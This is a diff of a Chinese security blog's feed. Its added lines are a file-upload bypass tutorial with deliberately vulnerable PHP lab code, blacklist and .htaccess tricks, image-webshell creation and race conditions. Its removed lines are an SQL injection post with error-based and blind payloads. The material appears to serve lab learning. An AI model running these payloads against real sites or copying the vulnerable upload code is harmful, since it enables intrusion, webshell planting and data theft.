+&lt;h2 id=&#34;黑名单检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#黑名单检测&#34;&gt;#&lt;/a&gt; 黑名单检测&lt;/h2&gt;
+&lt;h3 id=&#34;特殊后缀绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特殊后缀绕过&#34;&gt;#&lt;/a&gt; 特殊后缀绕过&lt;/h3&gt;
+&lt;p&gt;所谓黑名单就是限制了哪些不可以上传，除去黑名单上的限制都可以。所以我们只要构造黑名单之外的后缀名即可绕过&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$is_upload &amp;#x3D; false;
+$msg &amp;#x3D; null;
+if (isset($_POST[&amp;#39;submit&amp;#39;])) &amp;#123;
+    if (file_exists(UPLOAD_PATH)) &amp;#123;
+        $deny_ext &amp;#x3D; array(&amp;#39;.asp&amp;#39;,&amp;#39;.aspx&amp;#39;,&amp;#39;.php&amp;#39;,&amp;#39;.jsp&amp;#39;);&amp;#x2F;&amp;#x2F;定义数组
+        $file_name &amp;#x3D; trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);&amp;#x2F;&amp;#x2F;移除字符串两侧的空白字符
+        $file_name &amp;#x3D; deldot($file_name);&amp;#x2F;&amp;#x2F;删除文件名末尾的点
+        $file_ext &amp;#x3D; strrchr($file_name, &amp;#39;.&amp;#39;);&amp;#x2F;&amp;#x2F;查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符   
+        $file_ext &amp;#x3D; strtolower($file_ext); &amp;#x2F;&amp;#x2F;转换为小写
+        $file_ext &amp;#x3D; str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);&amp;#x2F;&amp;#x2F;去除字符串::$DATA
+        &amp;#x2F;&amp;#x2F;php在windows的时候如果文件名+&amp;quot;::$DATA&amp;quot;会把其之后的数据当成文件流处理，不会检测后缀名。 且保持&amp;quot;:: $DATA&amp;quot;之前的文件名   1.php::$DATA  &amp;#x3D;&amp;#x3D;1.php
+        $file_ext &amp;#x3D; trim($file_ext); &amp;#x2F;&amp;#x2F;收尾去空 
+
+        if(!in_array($file_ext, $deny_ext))&amp;#x2F;&amp;#x2F;搜索$deny_ext这个数组里的$file_ext，且有为真
+        &amp;#123;
+            $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
+            $img_path &amp;#x3D; UPLOAD_PATH.&amp;#39;&amp;#x2F;&amp;#39;.date(&amp;quot;YmdHis&amp;quot;).rand(1000,9999).$file_ext;            
+            if (move_uploaded_file($temp_file,$img_path)) &amp;#123;
+                 $is_upload &amp;#x3D; true;
+            &amp;#125; else &amp;#123;
+                $msg &amp;#x3D; &amp;#39;上传出错！&amp;#39;;
+            &amp;#125;
+        &amp;#125; else &amp;#123;
+            $msg &amp;#x3D; &amp;#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&amp;#39;;
+        &amp;#125;
+    &amp;#125; else &amp;#123;
+        $msg &amp;#x3D; UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
+    &amp;#125;
+&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;strrchr()&lt;/strong&gt; 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;array()&lt;/strong&gt; 函数用于创建数组。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;数组类型：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;数值数组&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;带有数字 ID 键的数组&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;关联数组&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;带有指定的键的数组，每个键关联一个值&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;多维数组&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;包含一个或多个数组的数组&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;trim()&lt;/strong&gt; 函数移除字符串两侧的空白字符或其他预定义字符。&lt;/p&gt;
+&lt;p&gt;相关函数：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;ltrim()&lt;/strong&gt;： 移除字符串左侧的空白字符或其他预定义字符。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;rtrim()&lt;/strong&gt; 移除字符串右侧的空白字符或其他预定义字符。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;strtolower(string)&lt;/strong&gt; 函数把字符串转换为小写。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;str_ireplace()&lt;/strong&gt; 函数替换字符串中的一些字符（不区分大小写）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;in_array()&lt;/strong&gt; 函数搜索数组中是否存在指定的值。如果在数组中找到值则返回 TRUE，否则返回 FALSE&lt;/p&gt;
+&lt;h4 id=&#34;绕过方法-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过方法-2&#34;&gt;#&lt;/a&gt; 绕过方法&lt;/h4&gt;
+&lt;p&gt;只需要构造黑名单以外的后缀名即可进行绕过，所以我们上传后缀名为 &lt;code&gt;.php1、.php2、phtml&lt;/code&gt;  等等都可以完成绕过，然后成功上传了一句话木马，用菜刀或者蚁剑连接即可&lt;/p&gt;
+&lt;h4 id=&#34;注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注意&#34;&gt;#&lt;/a&gt; 注意&lt;/h4&gt;
+&lt;p&gt;要在 apache 的 httpd.conf 中有如下配置代码：AddType application/x-httpd-php .php .phtml .phps .php5 .pht，如果不配置他是无法解析 php5 代码的&lt;/p&gt;
+&lt;p&gt;PHPStudy 中 AddType application/x-httpd-php 等 Apache 命令之所以在 Apache 的设置文件中设置后未实现目标效果是由于 PHP 的版本不符导致的，但注意这里的 PHP 版本并不是指 PHP7.3.0、PHP7.4.0 这种版本号，也不是适用于 32 位的 PHP、适用于 64 位的 PHP 这种不同机型的版本，而&lt;strong&gt;是 PHP 的 NTS (Non Thread Safe) 与 TS (Thread Safe) 的这种不同版本导致的&lt;/strong&gt;。&lt;/p&gt;
+&lt;h3 id=&#34;htaccess文件绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#htaccess文件绕过&#34;&gt;#&lt;/a&gt; .htaccess 文件绕过&lt;/h3&gt;
+&lt;p&gt;.htaccess 文件，全称是超文本入口，提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。&lt;/p&gt;
+&lt;p&gt;.htaccess 文件内容&lt;/p&gt;
+&lt;p&gt;AddType application/x-httpd-php .jpg&lt;/p&gt;
+&lt;p&gt;这样配置有一个问题，apache 会将所有的文件当作 php 文件解析，这样会明显影响系统的功能，改进代码如下，这样系统就只对文件名包含 “info.png” 字符串的文件进行解析. &amp;lt;FilesMatch &amp;quot;info.png&amp;quot;&amp;gt; setHandler application/x-httpd-php &amp;lt;/FilesMatch&amp;gt;&lt;/p&gt;
+&lt;h4 id=&#34;注意-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注意-2&#34;&gt;#&lt;/a&gt; 注意&lt;/h4&gt;
+&lt;p&gt;.htaccess 文件没有名字，他就是.htaccess 文件，如果你将他改为 4.htaccess 或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;如果以上操作都弄好了，还是出不来，还是去改 phpstudy 配置文件，其他选项菜单 -- 打开配置文件 ---httpd.conf&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2509712-20211105170239261-2058341176.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;箭头指向位置一开始 none, 改为 all 保存，重启 phpstudy，就可以了。&lt;/p&gt;
+&lt;h6 id=&#34;大小写绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#大小写绕过&#34;&gt;#&lt;/a&gt; 大小写绕过&lt;/h6&gt;
+&lt;p&gt;代码中没有对后缀名进行大小写过滤，而且 windows 对大小写不敏感&lt;/p&gt;
+&lt;h6 id=&#34;空格绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空格绕过&#34;&gt;#&lt;/a&gt; 空格绕过&lt;/h6&gt;
+&lt;p&gt;前提：Windows 下 xx.jpg [空格] 或者 xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows 会默认去除空格或点&lt;/p&gt;
+&lt;p&gt;它没有 trim () 函数，也就是用来去除字符串两端的空格，所以我们如果在上传文件的后缀名里面加上空格，它在黑名单之外，我们就可以成功进行上传&lt;/p&gt;
+&lt;h6 id=&#34;点绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#点绕过&#34;&gt;#&lt;/a&gt; 点绕过&lt;/h6&gt;
+&lt;p&gt;它没有 deldot () 函数，也就是不会删除我们文件名末尾的点 (.)，所以我们可以上传带有小数点的后缀名来进行绕过&lt;/p&gt;
+&lt;h6 id=&#34;流文件绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#流文件绕过&#34;&gt;#&lt;/a&gt; 流文件绕过&lt;/h6&gt;
+&lt;p&gt;我们可以在后缀名后面加上::$DATA 来进行绕过。&lt;/p&gt;
+&lt;h6 id=&#34;点空格点绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#点空格点绕过&#34;&gt;#&lt;/a&gt; 点空格点绕过&lt;/h6&gt;
+&lt;p&gt;它没有循环验证，也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次。所以我们的绕过思路就很简单，在数据包中把后缀名改为.php. .&lt;/p&gt;
+&lt;h6 id=&#34;后缀名双写绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后缀名双写绕过&#34;&gt;#&lt;/a&gt; 后缀名双写绕过&lt;/h6&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$file_name &amp;#x3D; str_ireplace($deny_ext,&amp;quot;&amp;quot;, $file_name);&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;它将 $deny_ext 这个数组里的数据都替换成了空，参考 sql 注入里的双写便可完成绕过。&lt;/p&gt;
+&lt;p&gt;1.phphpp&lt;/p&gt;
+&lt;p&gt;1.php&lt;/p&gt;
+&lt;h2 id=&#34;图片马绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#图片马绕过&#34;&gt;#&lt;/a&gt; 图片马绕过&lt;/h2&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;function getReailFileType($filename)&amp;#123;
+    $file &amp;#x3D; fopen($filename, &amp;quot;rb&amp;quot;);&amp;#x2F;&amp;#x2F;打开一个文件或 URL。&amp;quot;rb&amp;quot; 以二进制方式打开。
+    $bin &amp;#x3D; fread($file, 2); &amp;#x2F;&amp;#x2F;只读2字节
+    fclose($file);
+    $strInfo &amp;#x3D; @unpack(&amp;quot;C2chars&amp;quot;, $bin);    
+    $typeCode &amp;#x3D; intval($strInfo[&amp;#39;chars1&amp;#39;].$strInfo[&amp;#39;chars2&amp;#39;]);    
+    $fileType &amp;#x3D; &amp;#39;&amp;#39;;    
+    switch($typeCode)&amp;#123;      
+        case 255216:            
+            $fileType &amp;#x3D; &amp;#39;jpg&amp;#39;;
+            break;
+        case 13780:            
+            $fileType &amp;#x3D; &amp;#39;png&amp;#39;;
+            break;        
+        case 7173:            
+            $fileType &amp;#x3D; &amp;#39;gif&amp;#39;;
+            break;
+        default:            
+            $fileType &amp;#x3D; &amp;#39;unknown&amp;#39;;
+        &amp;#125;    
+        return $fileType;
+&amp;#125;
+
+$is_upload &amp;#x3D; false;
+$msg &amp;#x3D; null;
+if(isset($_POST[&amp;#39;submit&amp;#39;]))&amp;#123;
+    $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
+    $file_type &amp;#x3D; getReailFileType($temp_file);
+
+    if($file_type &amp;#x3D;&amp;#x3D; &amp;#39;unknown&amp;#39;)&amp;#123;
+        $msg &amp;#x3D; &amp;quot;文件未知，上传失败！&amp;quot;;
+    &amp;#125;else&amp;#123;
+        $img_path &amp;#x3D; UPLOAD_PATH.&amp;quot;&amp;#x2F;&amp;quot;.rand(10, 99).date(&amp;quot;YmdHis&amp;quot;).&amp;quot;.&amp;quot;.$file_type;
+        if(move_uploaded_file($temp_file,$img_path))&amp;#123;
+            $is_upload &amp;#x3D; true;
+        &amp;#125; else &amp;#123;
+            $msg &amp;#x3D; &amp;quot;上传出错！&amp;quot;;
+        &amp;#125;
+    &amp;#125;
+&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;图片马制作方法： copy a.jpg/b + shell.php/a shell.jpg/b 表示一个二进制文件 + 表示将多个文件合并成一个文件 /a 表示一个 ASCII 文本文件&lt;/p&gt;
+&lt;p&gt;fopen () 函数打开一个文件或 URL。&amp;quot;rb&amp;quot; 以二进制方式打开。&lt;/p&gt;
+&lt;p&gt;fread () 函数读取打开的文件。&lt;/p&gt;
+&lt;p&gt;fclose () 函数关闭一个打开文件&lt;/p&gt;
+&lt;p&gt;unpack () 函数从二进制字符串对数据进行解包。&lt;/p&gt;
+&lt;p&gt;intval () 函数用于获取变量的整数值。&lt;/p&gt;
+&lt;h2 id=&#34;条件竞争上传&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#条件竞争上传&#34;&gt;#&lt;/a&gt; 条件竞争上传&lt;/h2&gt;
+&lt;p&gt;条件竞争漏洞是一种服务器端漏洞，由于服务器端在处理用户请求时，是并发进行的，因此 如果并非处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$is_upload &amp;#x3D; false;
+$msg &amp;#x3D; null;
+
+if(isset($_POST[&amp;#39;submit&amp;#39;]))
+&amp;#123;
+    $ext_arr &amp;#x3D; array(&amp;#39;jpg&amp;#39;,&amp;#39;png&amp;#39;,&amp;#39;gif&amp;#39;);
+    $file_name &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;];
+    $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
+    $file_ext &amp;#x3D; substr($file_name,strrpos($file_name,&amp;quot;.&amp;quot;)+1);
+    $upload_file &amp;#x3D; UPLOAD_PATH . &amp;#39;&amp;#x2F;&amp;#39; . $file_name;
+
+    if(move_uploaded_file($temp_file, $upload_file))
+    &amp;#123;
+        if(in_array($file_ext,$ext_arr))
+        &amp;#123;
+             $img_path &amp;#x3D; UPLOAD_PATH . &amp;#39;&amp;#x2F;&amp;#39;. rand(10, 99).date(&amp;quot;YmdHis&amp;quot;).&amp;quot;.&amp;quot;.$file_ext;
+             rename($upload_file, $img_path);&amp;#x2F;&amp;#x2F;将$upload_file名字改为$img_path
+             $is_upload &amp;#x3D; true;
+        &amp;#125;
+     else
+        &amp;#123;
+            $msg &amp;#x3D; &amp;quot;只允许上传.jpg|.png|.gif类型文件！&amp;quot;;
+            unlink($upload_file);
+        &amp;#125;
+    &amp;#125;else&amp;#123;
+        $msg &amp;#x3D; &amp;#39;上传出错！&amp;#39;;
+    &amp;#125;
+&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;strrpos () 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）&lt;/p&gt;
+&lt;p&gt;substr () 函数返回字符串的一部分。&lt;/p&gt;
+&lt;p&gt;rename () 函数重命名文件或目录。若成功，则该函数返回 true。若失败，则返回 false。&lt;/p&gt;
+&lt;p&gt;unlink () 函数删除文件。如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -4694,47 +4632,133 @@ Linklist &lt;span class=&#34;token function&#34;&gt;listcreeth&lt;/span&gt;&lt;s
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">https://blog.xcu.icu/2022/09/23/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</guid>
-            <title>报错注入</title>
-            <link>https://blog.xcu.icu/2022/09/23/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</link>
-            <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
-            <category term="SQL注入" scheme="https://blog.xcu.icu/tags/SQL%E6%B3%A8%E5%85%A5/" />
-            <pubDate>Fri, 23 Sep 2022 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言；&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzQwNjMyMjA5ODc=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;因为当时学习的时候，对于这一块手注太麻烦，所以大致了解了一下原理和语句就跑路了，现在又想到这一块，所以回来把这一块再总结一下。&lt;/p&gt;
-&lt;h2 id=&#34;1-什么是盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-什么是盲注&#34;&gt;#&lt;/a&gt; 1、什么是盲注&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzUzNDk2NzUyMQ==&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;首先 sql 注入是因为开发者对用户输入的数据没有进行严格的过滤，导致攻击者通过在规定语句后加入其他恶意查询语句，达到在管理员不知情的情况下查询到数据库数据，而盲注就是在页面没有回显的情况下去判断数据是否正确。&lt;/p&gt;
-&lt;h2 id=&#34;2-报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-报错注入&#34;&gt;#&lt;/a&gt; 2、报错注入&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzI0MDk2OTE4MjE=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;报错注入就是在页面没有回显的情况下，尝试引起报错回显到页面上来引起报错，而我们需要的数据就会在报错中显示出来&lt;/p&gt;
-&lt;p&gt;而报错注入也分为两种，数据库 bug 报错和函数报错&lt;/p&gt;
-&lt;p&gt;首先数据库 bug 报错，主要是因为主键的唯一性，在 select floor (rand (0)&lt;em&gt;2),count(&lt;/em&gt;) from users group by floor (rand (0)*2); 导致主键冲突，详见&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAxNTYwMS5odG1s&#34;&gt; floor 报错注入原理 - Joker-qi - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;接着是函数报错，常用的有 updataxml 和 extractvalue 两个函数的报错注入。&lt;/p&gt;
-&lt;p&gt;首先是 updataxml 函数的报错注入；&lt;/p&gt;
-&lt;p&gt;常见报错语句 payload；格式；and updataxml (1,concat (0x7e, 注入语句，0x7e),1)--+&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and updatexml(1,concat(0x7e,database(),0x7e),1)-- 
-and updatexml(1,concat(substr(select group_concat(table_name) from information_schema.tables where table_schema&amp;#x3D;&amp;#39;security&amp;#39;),1)),1)-- 
-and updatexml(1,concat(0x5e,(substr((select group_concat(table_name) from information_schema.tables where table_schema&amp;#x3D;&amp;#39;security&amp;#39;),1)),0x5e),1)-- 
-and updatexml(0x5e,databse(),0x5e)-- &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;这个函数的报错原理是 concat 将字符连接会不符合 xpath-string 格式导致抛出异常，而报出我们需要的数据，这个函数会限制返回字符长度，为 32 位，我们可以配合 mid (),left (),substr () 和 right () 等函数使用来爆出全部数据。&lt;/p&gt;
-&lt;p&gt;对于 extractvalue 函数和 updataxml 函数用法一样，比 updataxml 少了后面的一个字符。&lt;/p&gt;
-&lt;h2 id=&#34;3-布尔盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-布尔盲注&#34;&gt;#&lt;/a&gt; 3、布尔盲注&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzI5MTIyNjA2Ng==&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;布尔是计算机中的两种类型，ture 和 false 两种，即页面回显正常和回显不正常&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and length(database())&amp;#x3D;X --+ 当X&amp;#x3D;8是页面回显正常，此时我们可以判断该数据库的库名有八个字段组成&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;先判断出数据库长度&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and ascii(substr(database(),1,1))&amp;#x3D;115 --+对其进行逐个爆破&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;知道判断出八个字符组成数据库名&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and length((select table_name from information_schema.tables where table_schema&amp;#x3D;database() limit 0,1))&amp;#x3D;X --+当X&amp;#x3D;6的时候我们发现网页给我们回显正常，此次我们可以确定第一个表的是由6个字符组成的&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;第一个表是 6 个字段，可以通过改 limit 中的数来猜不同的表&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and ascii(substr((select table_name from information_schema.tables where table_schema&amp;#x3D;database() limit 0,1),1,1))&amp;#x3D;100 --+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;爆第一表&lt;/p&gt;
-&lt;h2 id=&#34;4-时间盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-时间盲注&#34;&gt;#&lt;/a&gt; 4、时间盲注&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzE4MDIyMDQ2MDU=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;时间盲注，通过写入对时间敏感的语句，来通过响应时间的长短来判断是否执行成功&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and if(length(database())&amp;gt;8,sleep(2),0) --+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;判断数据库长度&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt; and if(ascii(substr(database(),1,1))&amp;#x3D;115,sleep(2),0) --+
-此为判断第一个字母的ascii码是否为115&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;判断数据库名字&lt;/p&gt;
